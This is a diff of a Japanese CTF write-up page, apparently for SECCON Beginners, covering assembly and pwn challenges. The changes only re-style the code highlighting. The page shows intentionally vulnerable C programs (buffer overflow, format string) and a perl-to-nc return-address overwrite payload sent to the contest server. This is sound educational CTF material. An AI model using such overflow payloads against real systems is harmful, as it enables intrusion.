@@ -106,37 +106,34 @@ ROPに関しては今回も全く分からなかったのでこれは今後の�
 <h1 id="reversing-assemble-tu-zhong-madejie-keta">reversing / assemble (途中まで解けた)</h1>
 <p>challenge 1, 2, 3までは解けました。</p>
 <p>challenge 1</p>
-<pre style="background-color:#151515;color:#e8e8d3;"><code><span>mod rax, 0x123
-</span></code></pre>
+<pre class="giallo" style="color: #A9B1D6; background-color: #1A1B26;"><code data-lang="plain"><span class="giallo-l"><span>mod rax, 0x123</span></span></code></pre>
 <p>challenge 2</p>
-<pre style="background-color:#151515;color:#e8e8d3;"><code><span>mov rax, 0x123
-</span><span>push rax
-</span></code></pre>
+<pre class="giallo" style="color: #A9B1D6; background-color: #1A1B26;"><code data-lang="plain"><span class="giallo-l"><span>mov rax, 0x123</span></span>
+<span class="giallo-l"><span>push rax</span></span></code></pre>
 <p>challenge 3</p>
-<pre style="background-color:#151515;color:#e8e8d3;"><code><span>mov rax, 0x1
-</span><span>mov rdi, 0x1
-</span><span>mov rdx, 0x1
-</span><span>
-</span><span>push 0x48
-</span><span>mov rsi, rsp
-</span><span>syscall
-</span><span>
-</span><span>push 0x65
-</span><span>mov rsi, rsp
-</span><span>syscall
-</span><span>
-</span><span>push 0x6c
-</span><span>mov rsi, rsp
-</span><span>syscall
-</span><span>
-</span><span>push 0x6c
-</span><span>mov rsi, rsp
-</span><span>syscall
-</span><span>
-</span><span>push 0x6f
-</span><span>mov rsi, rsp
-</span><span>syscall
-</span></code></pre>
+<pre class="giallo" style="color: #A9B1D6; background-color: #1A1B26;"><code data-lang="plain"><span class="giallo-l"><span>mov rax, 0x1</span></span>
+<span class="giallo-l"><span>mov rdi, 0x1</span></span>
+<span class="giallo-l"><span>mov rdx, 0x1</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span>push 0x48</span></span>
+<span class="giallo-l"><span>mov rsi, rsp</span></span>
+<span class="giallo-l"><span>syscall</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span>push 0x65</span></span>
+<span class="giallo-l"><span>mov rsi, rsp</span></span>
+<span class="giallo-l"><span>syscall</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span>push 0x6c</span></span>
+<span class="giallo-l"><span>mov rsi, rsp</span></span>
+<span class="giallo-l"><span>syscall</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span>push 0x6c</span></span>
+<span class="giallo-l"><span>mov rsi, rsp</span></span>
+<span class="giallo-l"><span>syscall</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span>push 0x6f</span></span>
+<span class="giallo-l"><span>mov rsi, rsp</span></span>
+<span class="giallo-l"><span>syscall</span></span></code></pre>
 <p>多分challenge 3に関しては文字列をまとめて<code>push</code>してから、<code>write</code>システムコールかければ一回で文字列を出力できたと思います。つまり無駄に長い回答ってこと。</p>
 <p>challenge 4が無理でした。</p>
 <hr />
@@ -147,142 +144,131 @@ ROPに関しては今回も全く分からなかったのでこれは今後の�
 <p>mainが他の関数などを制御してないプログラムを初めて見たので全く歯が立ちませんでした。</p>
 <hr />
 <h1 id="pwn-simpleoverflow">pwn / simpleoverflow</h1>
-<pre data-lang="c" style="background-color:#151515;color:#e8e8d3;" class="language-c "><code class="language-c" data-lang="c"><span style="color:#8fbfdc;">#include </span><span style="color:#556633;">&lt;</span><span style="color:#99ad6a;">stdio.h</span><span style="color:#556633;">&gt;
-</span><span style="color:#8fbfdc;">#include </span><span style="color:#556633;">&lt;</span><span style="color:#99ad6a;">stdlib.h</span><span style="color:#556633;">&gt;
-</span><span style="color:#8fbfdc;">#include </span><span style="color:#556633;">&lt;</span><span style="color:#99ad6a;">unistd.h</span><span style="color:#556633;">&gt;
-</span><span>
-</span><span style="color:#8fbfdc;">int </span><span style="color:#fad07a;">main</span><span>() {
-</span><span>  </span><span style="color:#8fbfdc;">char</span><span> buf[</span><span style="color:#cf6a4c;">10</span><span>] = {</span><span style="color:#cf6a4c;">0</span><span>};
-</span><span>  </span><span style="color:#8fbfdc;">int</span><span> is_admin = </span><span style="color:#cf6a4c;">0</span><span>;
-</span><span>  printf(</span><span style="color:#556633;">&quot;</span><span style="color:#99ad6a;">name:</span><span style="color:#556633;">&quot;</span><span>);
-</span><span>  </span><span style="color:#ffb964;">read</span><span>(</span><span style="color:#cf6a4c;">0</span><span>, buf, </span><span style="color:#cf6a4c;">0x10</span><span>);
-</span><span>  printf(</span><span style="color:#556633;">&quot;</span><span style="color:#99ad6a;">Hello, </span><span style="color:#7697d6;">%s</span><span style="color:#99ad6a;">\n</span><span style="color:#556633;">&quot;</span><span>, buf);
-</span><span>  </span><span style="color:#8fbfdc;">if </span><span>(!is_admin) {
-</span><span>    puts(</span><span style="color:#556633;">&quot;</span><span style="color:#99ad6a;">You are not admin. bye</span><span style="color:#556633;">&quot;</span><span>);
-</span><span>  } </span><span style="color:#8fbfdc;">else </span><span>{
-</span><span>    system(</span><span style="color:#556633;">&quot;</span><span style="color:#99ad6a;">/bin/cat ./flag.txt</span><span style="color:#556633;">&quot;</span><span>);
-</span><span>  }
-</span><span>  </span><span style="color:#8fbfdc;">return </span><span style="color:#cf6a4c;">0</span><span>;
-</span><span>}
-</span><span>
-</span><span style="color:#8fbfdc;">__attribute__</span><span>((constructor)) </span><span style="color:#8fbfdc;">void </span><span style="color:#fad07a;">init</span><span>() {
-</span><span>  setvbuf(stdin, NULL, _IONBF, </span><span style="color:#cf6a4c;">0</span><span>);
-</span><span>  setvbuf(stdout, NULL, _IONBF, </span><span style="color:#cf6a4c;">0</span><span>);
-</span><span>  </span><span style="color:#ffb964;">alarm</span><span>(</span><span style="color:#cf6a4c;">120</span><span>);
-</span><span>}
-</span><span>
-</span></code></pre>
+<pre class="giallo" style="color: #A9B1D6; background-color: #1A1B26;"><code data-lang="c"><span class="giallo-l"><span style="color: #89DDFF;">#</span><span style="color: #BB9AF7;">include</span><span style="color: #89DDFF;"> &lt;</span><span style="color: #9ECE6A;">stdio.h</span><span style="color: #89DDFF;">&gt;</span></span>
+<span class="giallo-l"><span style="color: #89DDFF;">#</span><span style="color: #BB9AF7;">include</span><span style="color: #89DDFF;"> &lt;</span><span style="color: #9ECE6A;">stdlib.h</span><span style="color: #89DDFF;">&gt;</span></span>
+<span class="giallo-l"><span style="color: #89DDFF;">#</span><span style="color: #BB9AF7;">include</span><span style="color: #89DDFF;"> &lt;</span><span style="color: #9ECE6A;">unistd.h</span><span style="color: #89DDFF;">&gt;</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span style="color: #BB9AF7;">int</span><span style="color: #7AA2F7;"> main</span><span style="color: #9ABDF5;">() {</span></span>
+<span class="giallo-l"><span style="color: #BB9AF7;">  char</span><span style="color: #C0CAF5;"> buf</span><span style="color: #9ABDF5;">[</span><span style="color: #FF9E64;">10</span><span style="color: #9ABDF5;">]</span><span style="color: #89DDFF;"> =</span><span style="color: #9ABDF5;"> {</span><span style="color: #FF9E64;">0</span><span style="color: #9ABDF5;">}</span><span style="color: #89DDFF;">;</span></span>
+<span class="giallo-l"><span style="color: #BB9AF7;">  int</span><span style="color: #9ABDF5;"> is_admin </span><span style="color: #89DDFF;">=</span><span style="color: #FF9E64;"> 0</span><span style="color: #89DDFF;">;</span></span>
+<span class="giallo-l"><span style="color: #7AA2F7;">  printf</span><span style="color: #9ABDF5;">(</span><span style="color: #89DDFF;">&quot;</span><span style="color: #9ECE6A;">name:</span><span style="color: #89DDFF;">&quot;</span><span style="color: #9ABDF5;">)</span><span style="color: #89DDFF;">;</span></span>
+<span class="giallo-l"><span style="color: #7AA2F7;">  read</span><span style="color: #9ABDF5;">(</span><span style="color: #FF9E64;">0</span><span style="color: #89DDFF;">,</span><span style="color: #7AA2F7;"> buf</span><span style="color: #89DDFF;">,</span><span style="color: #F7768E;"> 0x</span><span style="color: #FF9E64;">10</span><span style="color: #9ABDF5;">)</span><span style="color: #89DDFF;">;</span></span>
+<span class="giallo-l"><span style="color: #7AA2F7;">  printf</span><span style="color: #9ABDF5;">(</span><span style="color: #89DDFF;">&quot;</span><span style="color: #9ECE6A;">Hello, </span><span style="color: #C0CAF5;">%s</span><span style="color: #89DDFF;">\n&quot;,</span><span style="color: #7AA2F7;"> buf</span><span style="color: #9ABDF5;">)</span><span style="color: #89DDFF;">;</span></span>
+<span class="giallo-l"><span style="color: #BB9AF7;">  if</span><span style="color: #9ABDF5;"> (</span><span style="color: #BB9AF7;">!</span><span style="color: #9ABDF5;">is_admin) {</span></span>
+<span class="giallo-l"><span style="color: #7AA2F7;">    puts</span><span style="color: #9ABDF5;">(</span><span style="color: #89DDFF;">&quot;</span><span style="color: #9ECE6A;">You are not admin. bye</span><span style="color: #89DDFF;">&quot;</span><span style="color: #9ABDF5;">)</span><span style="color: #89DDFF;">;</span></span>
+<span class="giallo-l"><span style="color: #9ABDF5;">  }</span><span style="color: #BB9AF7;"> else</span><span style="color: #9ABDF5;"> {</span></span>
+<span class="giallo-l"><span style="color: #7AA2F7;">    system</span><span style="color: #9ABDF5;">(</span><span style="color: #89DDFF;">&quot;</span><span style="color: #9ECE6A;">/bin/cat ./flag.txt</span><span style="color: #89DDFF;">&quot;</span><span style="color: #9ABDF5;">)</span><span style="color: #89DDFF;">;</span></span>
+<span class="giallo-l"><span style="color: #9ABDF5;">  }</span></span>
+<span class="giallo-l"><span style="color: #BB9AF7;">  return</span><span style="color: #FF9E64;"> 0</span><span style="color: #89DDFF;">;</span></span>
+<span class="giallo-l"><span style="color: #9ABDF5;">}</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span style="color: #7AA2F7;">__attribute__</span><span style="color: #9ABDF5;">((</span><span>constructor</span><span style="color: #9ABDF5;">))</span><span style="color: #BB9AF7;"> void</span><span style="color: #7AA2F7;"> init</span><span style="color: #9ABDF5;">() {</span></span>
+<span class="giallo-l"><span style="color: #7AA2F7;">  setvbuf</span><span style="color: #9ABDF5;">(</span><span style="color: #7AA2F7;">stdin</span><span style="color: #89DDFF;">,</span><span style="color: #FF9E64;"> NULL</span><span style="color: #89DDFF;">,</span><span style="color: #7AA2F7;"> _IONBF</span><span style="color: #89DDFF;">,</span><span style="color: #FF9E64;"> 0</span><span style="color: #9ABDF5;">)</span><span style="color: #89DDFF;">;</span></span>
+<span class="giallo-l"><span style="color: #7AA2F7;">  setvbuf</span><span style="color: #9ABDF5;">(</span><span style="color: #7AA2F7;">stdout</span><span style="color: #89DDFF;">,</span><span style="color: #FF9E64;"> NULL</span><span style="color: #89DDFF;">,</span><span style="color: #7AA2F7;"> _IONBF</span><span style="color: #89DDFF;">,</span><span style="color: #FF9E64;"> 0</span><span style="color: #9ABDF5;">)</span><span style="color: #89DDFF;">;</span></span>
+<span class="giallo-l"><span style="color: #7AA2F7;">  alarm</span><span style="color: #9ABDF5;">(</span><span style="color: #FF9E64;">120</span><span style="color: #9ABDF5;">)</span><span style="color: #89DDFF;">;</span></span>
+<span class="giallo-l"><span style="color: #9ABDF5;">}</span></span>
+<span class="giallo-l"></span></code></pre>
 <p>ソースコードを見ると、<code>buf[10]</code>に対して、<code>read(0, buf, 0x10)</code>としており、<code>0x10</code>は10進数に直すと16なので、bufの領域を超えて値を書き込めることが分かりました。
 さらには<code>is_admin</code>が<code>buf</code>より上位のアドレスにあるため、バッファオーバーフローで値が上書きできそうだと分かります。
 C言語は0でなければtrueなので、<code>if(!is_admin)</code>において<code>else</code>が実行されてフラグが獲得できます。</p>
 <hr />
 <h1 id="pwn-simpleoverwrite">pwn / simpleoverwrite</h1>
-<pre data-lang="c" style="background-color:#151515;color:#e8e8d3;" class="language-c "><code class="language-c" data-lang="c"><span style="color:#8fbfdc;">#include </span><span style="color:#556633;">&lt;</span><span style="color:#99ad6a;">stdint.h</span><span style="color:#556633;">&gt;
-</span><span style="color:#8fbfdc;">#include </span><span style="color:#556633;">&lt;</span><span style="color:#99ad6a;">stdio.h</span><span style="color:#556633;">&gt;
-</span><span style="color:#8fbfdc;">#include </span><span style="color:#556633;">&lt;</span><span style="color:#99ad6a;">stdlib.h</span><span style="color:#556633;">&gt;
-</span><span style="color:#8fbfdc;">#include </span><span style="color:#556633;">&lt;</span><span style="color:#99ad6a;">unistd.h</span><span style="color:#556633;">&gt;
-</span><span>
-</span><span style="color:#8fbfdc;">void </span><span style="color:#fad07a;">win</span><span>() {
-</span><span>  </span><span style="color:#8fbfdc;">char</span><span> buf[</span><span style="color:#cf6a4c;">100</span><span>];
-</span><span>  FILE *f = fopen(</span><span style="color:#556633;">&quot;</span><span style="color:#99ad6a;">./flag.txt</span><span style="color:#556633;">&quot;</span><span>, </span><span style="color:#556633;">&quot;</span><span style="color:#99ad6a;">r</span><span style="color:#556633;">&quot;</span><span>);
-</span><span>  fgets(buf, </span><span style="color:#cf6a4c;">100</span><span>, f);
-</span><span>  puts(buf);
-</span><span>}
-</span><span>
-</span><span style="color:#8fbfdc;">int </span><span style="color:#fad07a;">main</span><span>() {
-</span><span>  </span><span style="color:#8fbfdc;">char</span><span> buf[</span><span style="color:#cf6a4c;">10</span><span>] = {</span><span style="color:#cf6a4c;">0</span><span>};
-</span><span>  printf(</span><span style="color:#556633;">&quot;</span><span style="color:#99ad6a;">input:</span><span style="color:#556633;">&quot;</span><span>);
-</span><span>  </span><span style="color:#ffb964;">read</span><span>(</span><span style="color:#cf6a4c;">0</span><span>, buf, </span><span style="color:#cf6a4c;">0x20</span><span>);
-</span><span>  printf(</span><span style="color:#556633;">&quot;</span><span style="color:#99ad6a;">Hello, </span><span style="color:#7697d6;">%s</span><span style="color:#99ad6a;">\n</span><span style="color:#556633;">&quot;</span><span>, buf);
-</span><span>  printf(</span><span style="color:#556633;">&quot;</span><span style="color:#99ad6a;">return to: 0x</span><span style="color:#7697d6;">%lx</span><span style="color:#99ad6a;">\n</span><span style="color:#556633;">&quot;</span><span>, *(uint64_t *)(((</span><span style="color:#8fbfdc;">void </span><span>*)buf) + </span><span style="color:#cf6a4c;">18</span><span>));
-</span><span>  </span><span style="color:#8fbfdc;">return </span><span style="color:#cf6a4c;">0</span><span>;
-</span><span>}
-</span><span>
-</span><span style="color:#8fbfdc;">__attribute__</span><span>((constructor)) </span><span style="color:#8fbfdc;">void </span><span style="color:#fad07a;">init</span><span>() {
-</span><span>  setvbuf(stdin, NULL, _IONBF, </span><span style="color:#cf6a4c;">0</span><span>);
-</span><span>  setvbuf(stdout, NULL, _IONBF, </span><span style="color:#cf6a4c;">0</span><span>);
-</span><span>  </span><span style="color:#ffb964;">alarm</span><span>(</span><span style="color:#cf6a4c;">120</span><span>);
-</span><span>}
-</span></code></pre>
+<pre class="giallo" style="color: #A9B1D6; background-color: #1A1B26;"><code data-lang="c"><span class="giallo-l"><span style="color: #89DDFF;">#</span><span style="color: #BB9AF7;">include</span><span style="color: #89DDFF;"> &lt;</span><span style="color: #9ECE6A;">stdint.h</span><span style="color: #89DDFF;">&gt;</span></span>
+<span class="giallo-l"><span style="color: #89DDFF;">#</span><span style="color: #BB9AF7;">include</span><span style="color: #89DDFF;"> &lt;</span><span style="color: #9ECE6A;">stdio.h</span><span style="color: #89DDFF;">&gt;</span></span>
+<span class="giallo-l"><span style="color: #89DDFF;">#</span><span style="color: #BB9AF7;">include</span><span style="color: #89DDFF;"> &lt;</span><span style="color: #9ECE6A;">stdlib.h</span><span style="color: #89DDFF;">&gt;</span></span>
+<span class="giallo-l"><span style="color: #89DDFF;">#</span><span style="color: #BB9AF7;">include</span><span style="color: #89DDFF;"> &lt;</span><span style="color: #9ECE6A;">unistd.h</span><span style="color: #89DDFF;">&gt;</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span style="color: #BB9AF7;">void</span><span style="color: #7AA2F7;"> win</span><span style="color: #9ABDF5;">() {</span></span>
+<span class="giallo-l"><span style="color: #BB9AF7;">  char</span><span style="color: #C0CAF5;"> buf</span><span style="color: #9ABDF5;">[</span><span style="color: #FF9E64;">100</span><span style="color: #9ABDF5;">]</span><span style="color: #89DDFF;">;</span></span>
+<span class="giallo-l"><span style="color: #9ABDF5;">  FILE </span><span style="color: #89DDFF;">*</span><span style="color: #9ABDF5;">f </span><span style="color: #89DDFF;">=</span><span style="color: #7AA2F7;"> fopen</span><span style="color: #9ABDF5;">(</span><span style="color: #89DDFF;">&quot;</span><span style="color: #9ECE6A;">./flag.txt</span><span style="color: #89DDFF;">&quot;, &quot;</span><span style="color: #9ECE6A;">r</span><span style="color: #89DDFF;">&quot;</span><span style="color: #9ABDF5;">)</span><span style="color: #89DDFF;">;</span></span>
+<span class="giallo-l"><span style="color: #7AA2F7;">  fgets</span><span style="color: #9ABDF5;">(</span><span style="color: #7AA2F7;">buf</span><span style="color: #89DDFF;">,</span><span style="color: #FF9E64;"> 100</span><span style="color: #89DDFF;">,</span><span style="color: #7AA2F7;"> f</span><span style="color: #9ABDF5;">)</span><span style="color: #89DDFF;">;</span></span>
+<span class="giallo-l"><span style="color: #7AA2F7;">  puts</span><span style="color: #9ABDF5;">(</span><span style="color: #7AA2F7;">buf</span><span style="color: #9ABDF5;">)</span><span style="color: #89DDFF;">;</span></span>
+<span class="giallo-l"><span style="color: #9ABDF5;">}</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span style="color: #BB9AF7;">int</span><span style="color: #7AA2F7;"> main</span><span style="color: #9ABDF5;">() {</span></span>
+<span class="giallo-l"><span style="color: #BB9AF7;">  char</span><span style="color: #C0CAF5;"> buf</span><span style="color: #9ABDF5;">[</span><span style="color: #FF9E64;">10</span><span style="color: #9ABDF5;">]</span><span style="color: #89DDFF;"> =</span><span style="color: #9ABDF5;"> {</span><span style="color: #FF9E64;">0</span><span style="color: #9ABDF5;">}</span><span style="color: #89DDFF;">;</span></span>
+<span class="giallo-l"><span style="color: #7AA2F7;">  printf</span><span style="color: #9ABDF5;">(</span><span style="color: #89DDFF;">&quot;</span><span style="color: #9ECE6A;">input:</span><span style="color: #89DDFF;">&quot;</span><span style="color: #9ABDF5;">)</span><span style="color: #89DDFF;">;</span></span>
+<span class="giallo-l"><span style="color: #7AA2F7;">  read</span><span style="color: #9ABDF5;">(</span><span style="color: #FF9E64;">0</span><span style="color: #89DDFF;">,</span><span style="color: #7AA2F7;"> buf</span><span style="color: #89DDFF;">,</span><span style="color: #F7768E;"> 0x</span><span style="color: #FF9E64;">20</span><span style="color: #9ABDF5;">)</span><span style="color: #89DDFF;">;</span></span>
+<span class="giallo-l"><span style="color: #7AA2F7;">  printf</span><span style="color: #9ABDF5;">(</span><span style="color: #89DDFF;">&quot;</span><span style="color: #9ECE6A;">Hello, </span><span style="color: #C0CAF5;">%s</span><span style="color: #89DDFF;">\n&quot;,</span><span style="color: #7AA2F7;"> buf</span><span style="color: #9ABDF5;">)</span><span style="color: #89DDFF;">;</span></span>
+<span class="giallo-l"><span style="color: #7AA2F7;">  printf</span><span style="color: #9ABDF5;">(</span><span style="color: #89DDFF;">&quot;</span><span style="color: #9ECE6A;">return to: 0x</span><span style="color: #C0CAF5;">%lx</span><span style="color: #89DDFF;">\n&quot;, *</span><span style="color: #9ABDF5;">(</span><span style="color: #BB9AF7;">uint64_t</span><span style="color: #89DDFF;"> *</span><span style="color: #9ABDF5;">)(((</span><span style="color: #BB9AF7;">void</span><span style="color: #89DDFF;"> *</span><span style="color: #9ABDF5;">)</span><span style="color: #7AA2F7;">buf</span><span style="color: #9ABDF5;">)</span><span style="color: #89DDFF;"> +</span><span style="color: #FF9E64;"> 18</span><span style="color: #9ABDF5;">))</span><span style="color: #89DDFF;">;</span></span>
+<span class="giallo-l"><span style="color: #BB9AF7;">  return</span><span style="color: #FF9E64;"> 0</span><span style="color: #89DDFF;">;</span></span>
+<span class="giallo-l"><span style="color: #9ABDF5;">}</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span style="color: #7AA2F7;">__attribute__</span><span style="color: #9ABDF5;">((</span><span>constructor</span><span style="color: #9ABDF5;">))</span><span style="color: #BB9AF7;"> void</span><span style="color: #7AA2F7;"> init</span><span style="color: #9ABDF5;">() {</span></span>
+<span class="giallo-l"><span style="color: #7AA2F7;">  setvbuf</span><span style="color: #9ABDF5;">(</span><span style="color: #7AA2F7;">stdin</span><span style="color: #89DDFF;">,</span><span style="color: #FF9E64;"> NULL</span><span style="color: #89DDFF;">,</span><span style="color: #7AA2F7;"> _IONBF</span><span style="color: #89DDFF;">,</span><span style="color: #FF9E64;"> 0</span><span style="color: #9ABDF5;">)</span><span style="color: #89DDFF;">;</span></span>
+<span class="giallo-l"><span style="color: #7AA2F7;">  setvbuf</span><span style="color: #9ABDF5;">(</span><span style="color: #7AA2F7;">stdout</span><span style="color: #89DDFF;">,</span><span style="color: #FF9E64;"> NULL</span><span style="color: #89DDFF;">,</span><span style="color: #7AA2F7;"> _IONBF</span><span style="color: #89DDFF;">,</span><span style="color: #FF9E64;"> 0</span><span style="color: #9ABDF5;">)</span><span style="color: #89DDFF;">;</span></span>
+<span class="giallo-l"><span style="color: #7AA2F7;">  alarm</span><span style="color: #9ABDF5;">(</span><span style="color: #FF9E64;">120</span><span style="color: #9ABDF5;">)</span><span style="color: #89DDFF;">;</span></span>
+<span class="giallo-l"><span style="color: #9ABDF5;">}</span></span></code></pre>
 <p>Overflowとあるのでとりあえず大量に<code>A</code>を送ってみました。</p>
-<pre style="background-color:#151515;color:#e8e8d3;"><code><span>AAAAAAAAAAAAAAAAAAA
-</span></code></pre>
+<pre class="giallo" style="color: #A9B1D6; background-color: #1A1B26;"><code data-lang="plain"><span class="giallo-l"><span>AAAAAAAAAAAAAAAAAAA</span></span></code></pre>
 <p>ぐらいでリターンアドレスを1バイト侵食していたので、18バイトがリターンアドレスへのオフセットだと分かります。
 また<code>win()</code>関数が<code>0x401186</code>にあったため、</p>
-<pre style="background-color:#151515;color:#e8e8d3;"><code><span>perl -e &#39;print &quot;A&quot;x18 . &quot;\x86\x11\x40\x00&quot; | nc simpleoverwrite.beginners.seccon.games 9001
-</span></code></pre>
+<pre class="giallo" style="color: #A9B1D6; background-color: #1A1B26;"><code data-lang="plain"><span class="giallo-l"><span>perl -e &#39;print &quot;A&quot;x18 . &quot;\x86\x11\x40\x00&quot; | nc simpleoverwrite.beginners.seccon.games 9001</span></span></code></pre>
 <p>とすることでフラグがゲットできます。</p>
 <hr />
 <h1 id="pwn-pure-and-easy-jie-ketenai">pwn / pure-and-easy (解けてない)</h1>
 <p>解けていませんが、その時考えていた全てのアイデアを書いておきます。
 (後に他のwriteupとも比較するため)</p>
-<pre data-lang="c" style="background-color:#151515;color:#e8e8d3;" class="language-c "><code class="language-c" data-lang="c"><span style="color:#8fbfdc;">#include </span><span style="color:#556633;">&lt;</span><span style="color:#99ad6a;">stdio.h</span><span style="color:#556633;">&gt;
-</span><span style="color:#8fbfdc;">#include </span><span style="color:#556633;">&lt;</span><span style="color:#99ad6a;">stdlib.h</span><span style="color:#556633;">&gt;
-</span><span style="color:#8fbfdc;">#include </span><span style="color:#556633;">&lt;</span><span style="color:#99ad6a;">unistd.h</span><span style="color:#556633;">&gt;
-</span><span>
-</span><span style="color:#8fbfdc;">int </span><span style="color:#fad07a;">main</span><span>() {
-</span><span>  </span><span style="color:#8fbfdc;">char</span><span> buf[</span><span style="color:#cf6a4c;">0x100</span><span>] = {</span><span style="color:#cf6a4c;">0</span><span>};
-</span><span>  printf(</span><span style="color:#556633;">&quot;</span><span style="color:#99ad6a;">&gt; </span><span style="color:#556633;">&quot;</span><span>);
-</span><span>  </span><span style="color:#ffb964;">read</span><span>(</span><span style="color:#cf6a4c;">0</span><span>, buf, </span><span style="color:#cf6a4c;">0xff</span><span>);
-</span><span>  printf(buf);
-</span><span>  exit(</span><span style="color:#cf6a4c;">0</span><span>);
-</span><span>}
-</span><span>
-</span><span style="color:#8fbfdc;">void </span><span style="color:#fad07a;">win</span><span>() {
-</span><span>  </span><span style="color:#8fbfdc;">char</span><span> buf[</span><span style="color:#cf6a4c;">0x50</span><span>];
-</span><span>  FILE *fp = fopen(</span><span style="color:#556633;">&quot;</span><span style="color:#99ad6a;">./flag.txt</span><span style="color:#556633;">&quot;</span><span>, </span><span style="color:#556633;">&quot;</span><span style="color:#99ad6a;">r</span><span style="color:#556633;">&quot;</span><span>);
-</span><span>  fgets(buf, </span><span style="color:#cf6a4c;">0x50</span><span>, fp);
-</span><span>  puts(buf);
-</span><span>}
-</span><span>
-</span><span style="color:#8fbfdc;">__attribute__</span><span>((constructor)) </span><span style="color:#8fbfdc;">void </span><span style="color:#fad07a;">init</span><span>() {
-</span><span>  setvbuf(stdin, NULL, _IONBF, </span><span style="color:#cf6a4c;">0</span><span>);
-</span><span>  setvbuf(stdout, NULL, _IONBF, </span><span style="color:#cf6a4c;">0</span><span>);
-</span><span>  </span><span style="color:#ffb964;">alarm</span><span>(</span><span style="color:#cf6a4c;">120</span><span>);
-</span><span>}
-</span></code></pre>
+<pre class="giallo" style="color: #A9B1D6; background-color: #1A1B26;"><code data-lang="c"><span class="giallo-l"><span style="color: #89DDFF;">#</span><span style="color: #BB9AF7;">include</span><span style="color: #89DDFF;"> &lt;</span><span style="color: #9ECE6A;">stdio.h</span><span style="color: #89DDFF;">&gt;</span></span>
+<span class="giallo-l"><span style="color: #89DDFF;">#</span><span style="color: #BB9AF7;">include</span><span style="color: #89DDFF;"> &lt;</span><span style="color: #9ECE6A;">stdlib.h</span><span style="color: #89DDFF;">&gt;</span></span>
+<span class="giallo-l"><span style="color: #89DDFF;">#</span><span style="color: #BB9AF7;">include</span><span style="color: #89DDFF;"> &lt;</span><span style="color: #9ECE6A;">unistd.h</span><span style="color: #89DDFF;">&gt;</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span style="color: #BB9AF7;">int</span><span style="color: #7AA2F7;"> main</span><span style="color: #9ABDF5;">() {</span></span>
+<span class="giallo-l"><span style="color: #BB9AF7;">  char</span><span style="color: #C0CAF5;"> buf</span><span style="color: #9ABDF5;">[</span><span style="color: #F7768E;">0x</span><span style="color: #FF9E64;">100</span><span style="color: #9ABDF5;">]</span><span style="color: #89DDFF;"> =</span><span style="color: #9ABDF5;"> {</span><span style="color: #FF9E64;">0</span><span style="color: #9ABDF5;">}</span><span style="color: #89DDFF;">;</span></span>
+<span class="giallo-l"><span style="color: #7AA2F7;">  printf</span><span style="color: #9ABDF5;">(</span><span style="color: #89DDFF;">&quot;</span><span style="color: #9ECE6A;">&gt; </span><span style="color: #89DDFF;">&quot;</span><span style="color: #9ABDF5;">)</span><span style="color: #89DDFF;">;</span></span>
+<span class="giallo-l"><span style="color: #7AA2F7;">  read</span><span style="color: #9ABDF5;">(</span><span style="color: #FF9E64;">0</span><span style="color: #89DDFF;">,</span><span style="color: #7AA2F7;"> buf</span><span style="color: #89DDFF;">,</span><span style="color: #F7768E;"> 0x</span><span style="color: #FF9E64;">ff</span><span style="color: #9ABDF5;">)</span><span style="color: #89DDFF;">;</span></span>
+<span class="giallo-l"><span style="color: #7AA2F7;">  printf</span><span style="color: #9ABDF5;">(</span><span style="color: #7AA2F7;">buf</span><span style="color: #9ABDF5;">)</span><span style="color: #89DDFF;">;</span></span>
+<span class="giallo-l"><span style="color: #7AA2F7;">  exit</span><span style="color: #9ABDF5;">(</span><span style="color: #FF9E64;">0</span><span style="color: #9ABDF5;">)</span><span style="color: #89DDFF;">;</span></span>
+<span class="giallo-l"><span style="color: #9ABDF5;">}</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span style="color: #BB9AF7;">void</span><span style="color: #7AA2F7;"> win</span><span style="color: #9ABDF5;">() {</span></span>
+<span class="giallo-l"><span style="color: #BB9AF7;">  char</span><span style="color: #C0CAF5;"> buf</span><span style="color: #9ABDF5;">[</span><span style="color: #F7768E;">0x</span><span style="color: #FF9E64;">50</span><span style="color: #9ABDF5;">]</span><span style="color: #89DDFF;">;</span></span>
+<span class="giallo-l"><span style="color: #9ABDF5;">  FILE </span><span style="color: #89DDFF;">*</span><span style="color: #9ABDF5;">fp </span><span style="color: #89DDFF;">=</span><span style="color: #7AA2F7;"> fopen</span><span style="color: #9ABDF5;">(</span><span style="color: #89DDFF;">&quot;</span><span style="color: #9ECE6A;">./flag.txt</span><span style="color: #89DDFF;">&quot;, &quot;</span><span style="color: #9ECE6A;">r</span><span style="color: #89DDFF;">&quot;</span><span style="color: #9ABDF5;">)</span><span style="color: #89DDFF;">;</span></span>
+<span class="giallo-l"><span style="color: #7AA2F7;">  fgets</span><span style="color: #9ABDF5;">(</span><span style="color: #7AA2F7;">buf</span><span style="color: #89DDFF;">,</span><span style="color: #F7768E;"> 0x</span><span style="color: #FF9E64;">50</span><span style="color: #89DDFF;">,</span><span style="color: #7AA2F7;"> fp</span><span style="color: #9ABDF5;">)</span><span style="color: #89DDFF;">;</span></span>
+<span class="giallo-l"><span style="color: #7AA2F7;">  puts</span><span style="color: #9ABDF5;">(</span><span style="color: #7AA2F7;">buf</span><span style="color: #9ABDF5;">)</span><span style="color: #89DDFF;">;</span></span>
+<span class="giallo-l"><span style="color: #9ABDF5;">}</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span style="color: #7AA2F7;">__attribute__</span><span style="color: #9ABDF5;">((</span><span>constructor</span><span style="color: #9ABDF5;">))</span><span style="color: #BB9AF7;"> void</span><span style="color: #7AA2F7;"> init</span><span style="color: #9ABDF5;">() {</span></span>
